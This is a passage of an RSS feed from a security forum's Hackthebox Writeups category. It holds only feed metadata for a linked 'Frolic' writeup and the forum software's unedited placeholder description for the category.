          <link>https://0x00sec.org/t/hackthebox-writeup-frolic/12478</link>
          <pubDate>Sat, 23 Mar 2019 15:33:11 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-12478</guid>
          <source url="https://0x00sec.org/t/hackthebox-writeup-frolic/12478.rss">HackTheBox Writeup: Frolic</source>
        </item>
        <item>
          <title>About the Hackthebox Writeups category</title>
          <dc:creator><![CDATA[pry0cc]]></dc:creator>
          <category>Hackthebox Writeups</category>
          <description><![CDATA[
            <p>(Replace this first paragraph with a brief description of your new category. This guidance will appear in the category selection area, so try to keep it below 200 characters. <strong>Until you edit this description or create topics, this category won’t appear on the categories page.</strong>)</p>
<p>Use the following paragraphs for a longer description, or to establish category guidelines or rules:</p>
<ul>
<li>
<p>Why should people use this category? What is it for?</p>
</li>
<li>
<p>How exactly is this different than the other categories we already have?</p>
</li>
<li>
<p>What should topics in this category generally contain?</p>
</li>
<li>
<p>Do we need this category? Can we merge with another category, or subcategory?</p>
</li>
</ul>
            <p><small>1 post - 1 participant</small></p>
            <p><a href="https://0x00sec.org/t/about-the-hackthebox-writeups-category/12182">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/about-the-hackthebox-writeups-category/12182</link>
          <pubDate>Mon, 11 Mar 2019 12:17:54 +0000</pubDate>
          <discourse:topicPinned>Yes</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-12182</guid>
          <source url="https://0x00sec.org/t/about-the-hackthebox-writeups-category/12182.rss">About the Hackthebox Writeups category</source>
        </item>
  </channel>
</rss>
